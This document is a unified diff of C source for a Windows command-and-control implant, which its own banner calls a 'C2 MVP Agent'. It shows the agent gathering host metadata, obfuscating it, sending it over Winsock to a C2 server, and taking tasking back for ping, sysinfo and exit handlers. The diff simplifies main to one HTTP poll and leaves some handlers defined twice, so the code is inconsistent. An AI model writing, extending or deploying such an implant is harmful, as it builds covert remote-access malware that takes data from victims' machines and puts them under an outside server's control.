@@ -15,6 +15,7 @@
 #define HOST_METADATA_SIZE 256
 #define HTTP_HEADER_SIZE   512
 #define RESPONSE_MAX_SIZE 4096
+#define HTTP_OUTBOUND_MAX 2048
 
 
 // Declare the external functions so the compiler knows they exist
@@ -26,9 +27,6 @@ int CollectHostMetadata(char *buffer, size_t bufferSize);
 // Global Outbound Data Queue
 char G_CommandResultQueue[1024] = { 0 };
 BOOL G_HasPendingResults = FALSE;
-
-// Function declarations matching earlier milestones
-int CollectHostMetadata(char* destinationPayload, size_t maxPayloadSize);
 
 void HandlePing(void) {
     // Ping simply populates an acknowledgment message
@@ -49,11 +47,6 @@ void HandleSysInfo(void) {
     G_HasPendingResults = TRUE;
     
     printf("[+] SysInfo handled. Data structured and queued for transmission.\n");
-}
-
-void HandleExit(void) {
-    printf("[!] Exiting agent process.\n");
-    ExitProcess(0);
 }
 
 /**
@@ -95,7 +88,10 @@ void EstablishWinsockChannel(const char* payloadData, size_t dataSize) {
     char* mutablePayload = (char*)payloadData;
     ApplyNetworkObfuscation(mutablePayload, dataSize);
     
-    send(connectSocket, mutablePayload, (int)dataSize, 0);
+    result = send(connectSocket, mutablePayload, (int)dataSize, 0);
+    if (result == SOCKET_ERROR) {
+        goto CLEANUP;
+    }
 
     // 6. Read Incoming Response Stream (The C2 Server Tasking)
     // This blocks until the server sends its HTTP response packet
@@ -127,19 +123,8 @@ typedef struct {
 
 // --- Define individual command handler functions ---
 
-void HandlePing(void) {
-    printf("[+] Action Executed: PING. Agent status is healthy.\n");
-}
 
-void HandleSysInfo(void) {
-    printf("[+] Action Executed: SYSINFO. Gathering host state...\n");
-    char metadata[256];
-    SecureZeroMemory(metadata, sizeof(metadata));
-    
-    // Calls the collection function we built previously
-    CollectHostMetadata(metadata, sizeof(metadata));
-    printf("    [Telemetry Result]: %s\n", metadata);
-}
+
 
 void HandleExit(void) {
     printf("[!] Action Executed: EXIT. Terminating agent cleanly.\n");
@@ -211,11 +196,11 @@ void ApplyNetworkObfuscation(char* dataBuffer, size_t dataSize) {
     }
 }
 
-
 typedef enum _TRANSPORT_MODE {
     TRANSPORT_HTTP,
     TRANSPORT_RAW
 } TRANSPORT_MODE;
+
 
 /**
  * Collects basic host identity and serializes it for transport.
@@ -483,71 +468,11 @@ CLEANUP:
     if (wsaStarted) WSACleanup();
 }
 
-static void PrintUsage(const char *programName) {
-    printf("Usage: %s [--transport http|raw] [--raw]\n", programName);
-    printf("  Default: --transport http\n");
-}
 
-static int ParseTransportMode(int argc, char **argv, TRANSPORT_MODE *mode) {
-    int i = 0;
 
-    if (!mode) {
-        return 0;
-    }
 
-    *mode = TRANSPORT_HTTP;
 
-    for (i = 1; i < argc; i++) {
-        if (strcmp(argv[i], "--raw") == 0) {
-            *mode = TRANSPORT_RAW;
-        } else if (strcmp(argv[i], "--transport") == 0) {
-            if (i + 1 >= argc) {
-                return 0;
-            }
-
-            i++;
-            if (strcmp(argv[i], "http") == 0) {
-                *mode = TRANSPORT_HTTP;
-            } else if (strcmp(argv[i], "raw") == 0) {
-                *mode = TRANSPORT_RAW;
-            } else {
-                return 0;
-            }
-        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
-            return 0;
-        } else {
-            return 0;
-        }
-    }
-
-    return 1;
-}
-
-int main(int argc, char **argv) {
-    TRANSPORT_MODE transportMode = TRANSPORT_HTTP;
-
-    if (!ParseTransportMode(argc, argv, &transportMode)) {
-        PrintUsage(argv[0]);
-        return 1;
-    }
-
-    printf("[*] =========================================\n");
-    printf("[*] C2 MVP Agent Active (Milestone 1)\n");
-    printf("[*] Target C2 Node: %s:%d%s\n", C2_SERVER, C2_PORT, C2_ENDPOINT);
-    printf("[*] Transport Mode: %s\n", transportMode == TRANSPORT_HTTP ? "http" : "raw");
-    printf("[*] =========================================\n\n");
-
-    // Infinite execution loop
-    while (TRUE) {
-        if (transportMode == TRANSPORT_HTTP) {
-            PerformHttpPoll();
-        } else {
-            PerformRawSocketPoll();
-        }
-        
-        printf("[*] Loop cycle complete. Sleeping for %dms...\n\n", SLEEP_INTERVAL);
-        Sleep(SLEEP_INTERVAL);
-    }
-
+int main(void) {
+    PerformHttpPoll();
     return 0;
 }
